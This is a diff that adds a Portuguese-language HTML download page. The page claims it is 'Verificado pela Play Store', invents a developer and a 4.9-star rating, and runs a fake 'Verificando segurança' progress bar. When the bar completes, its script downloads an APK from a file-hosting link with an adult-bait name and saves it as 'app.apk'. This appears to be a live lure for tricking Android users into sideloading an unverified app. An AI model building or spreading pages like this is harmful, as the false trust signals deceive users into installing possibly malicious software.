@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Download Seguro</title>
+
+<style>
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: linear-gradient(135deg, #0f172a, #1e3a8a);
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  height: 100vh;
+}
+
+/* TOPO SEGURANÇA */
+.security {
+  position: absolute;
+  top: 20px;
+  text-align: center;
+  color: white;
+  font-size: 14px;
+}
+
+.badge {
+  background: #22c55e;
+  padding: 5px 12px;
+  border-radius: 20px;
+  font-size: 12px;
+  margin-right: 5px;
+}
+
+/* CARD */
+.card {
+  position: relative;
+  background: rgba(255,255,255,0.1);
+  backdrop-filter: blur(12px);
+  padding: 25px;
+  border-radius: 20px;
+  text-align: center;
+  width: 320px;
+  color: white;
+  box-shadow: 0 10px 40px rgba(0,0,0,0.4);
+}
+
+/* ÍCONE */
+.app-icon {
+  width: 80px;
+  border-radius: 20px;
+  margin-bottom: 10px;
+}
+
+/* TEXTO */
+.app-name {
+  font-size: 20px;
+  font-weight: bold;
+}
+
+.dev {
+  font-size: 13px;
+  color: #ccc;
+}
+
+/* AVALIAÇÃO */
+.rating {
+  margin: 10px 0;
+  font-size: 14px;
+}
+
+.stars {
+  color: #facc15;
+  font-size: 16px;
+}
+
+/* INFO */
+.info {
+  font-size: 12px;
+  color: #ddd;
+  margin-bottom: 10px;
+}
+
+/* BOTÃO */
+button {
+  margin-top: 15px;
+  padding: 12px;
+  width: 100%;
+  border: none;
+  border-radius: 30px;
+  background: #22c55e;
+  color: white;
+  font-size: 16px;
+  cursor: pointer;
+}
+
+/* LOADER */
+#loader {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  display: none;
+
+  backdrop-filter: blur(8px);
+  background: rgba(255,255,255,0.2);
+
+  border-radius: 20px;
+
+  justify-content: center;
+  align-items: center;
+  flex-direction: column;
+}
+
+/* BARRA */
+.progress {
+  width: 80%;
+  height: 6px;
+  background: rgba(255,255,255,0.3);
+  border-radius: 10px;
+  margin-top: 15px;
+}
+
+.progress-bar {
+  height: 100%;
+  width: 0%;
+  background: #22c55e;
+}
+
+/* STATUS */
+#status {
+  margin-top: 10px;
+  font-size: 13px;
+}
+</style>
+</head>
+
+<body>
+
+<!-- SEGURANÇA -->
+<div class="security">
+  
+  Verificado pela Play Store
+<p>
+<span class="badge">✔️ Verificado</span>
+</div>
+
+<!-- CARD -->
+<div class="card">
+
+  <!-- LOADER -->
+  <div id="loader">
+    <img src="https://conduz.mogidascruzes.sp.gov.br/public/img/salvando.gif" width="70">
+    <div id="status">Preparando...</div>
+
+    <div class="progress">
+      <div class="progress-bar" id="bar"></div>
+    </div>
+  </div>
+
+  <!-- APP -->
+  <img class="app-icon" src="https://semas.vitoria.es.gov.br/sigma/assets/images/iniciando.gif">
+
+  <div class="app-name">Baixar Agora</div>
+  <div class="dev">Playaptek Ltda.</div>
+
+  <!-- AVALIAÇÃO -->
+  <div class="rating">
+    <span class="stars">★★★★★</span> 4.9 • 10 mil avaliações
+  </div>
+
+  <!-- INFO -->
+  <div class="info">
+    📦 75 MB • 📱 Android 8.0+
+  </div>
+
+  <button onclick="startDownload()">Baixar Agora</button>
+
+</div>
+
+<script>
+function startDownload() {
+  const loader = document.getElementById("loader");
+  const bar = document.getElementById("bar");
+  const status = document.getElementById("status");
+
+  loader.style.display = "flex";
+
+  let progress = 0;
+
+  let interval = setInterval(() => {
+
+    if (progress < 60) {
+      progress += Math.random() * 6;
+      status.innerText = "Verificando segurança...";
+    } else if (progress < 90) {
+      progress += Math.random() * 3;
+      status.innerText = "Baixando...";
+    } else {
+      progress += 1;
+      status.innerText = "Finalizando...";
+    }
+
+    if (progress >= 100) {
+      progress = 100;
+      clearInterval(interval);
+
+      status.innerText = "Download iniciado ✔️";
+
+      setTimeout(() => {
+        const link = document.createElement("a");
+        link.href = "https://filedn.com/l5Q563uOChg5TLzpDnUiLrV/Gata/Sexy/GataSexyNua.apk";
+        link.download = "app.apk";
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+
+        loader.style.display = "none";
+      }, 1200);
+    }
+
+    bar.style.width = progress + "%";
+
+  }, 120);
+}
+</script>
+
+</body>
+</html>
